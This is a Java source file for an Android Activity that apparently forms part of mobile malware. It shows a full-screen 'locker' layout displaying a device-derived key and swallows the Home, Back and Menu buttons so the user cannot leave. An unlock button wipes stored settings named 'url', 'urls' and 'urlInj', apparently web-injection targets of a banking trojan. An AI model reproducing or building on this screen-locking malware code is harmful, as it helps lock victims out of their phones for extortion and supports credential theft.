package myapp.stuff.example.Activity;

import android.app.Activity;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.widget.TextView;

import myapp.stuff.example.R;
import myapp.stuff.example.UtilsClass;

public class ActivityScreenLocker extends Activity {
    UtilsClass SF = new UtilsClass();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.locker);
        TextView textView = findViewById(R.id.key);
        textView.setText(SF.ID_B(this));
        this.findViewById(R.id.killed).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                SF.SetWrite(ActivityScreenLocker.this, "url", "");
                SF.SetWrite(ActivityScreenLocker.this, "urls", "");
                SF.SetWrite(ActivityScreenLocker.this, "urlInj", "");
                UtilsClass.killed = false;
                finish();
            }
        });
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    protected void onResume() {
        super.onResume();
    }
    @Override
    protected void onStop() {
        super.onStop();
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
    @Override
    protected void onPause() {
        super.onPause();
    }
}
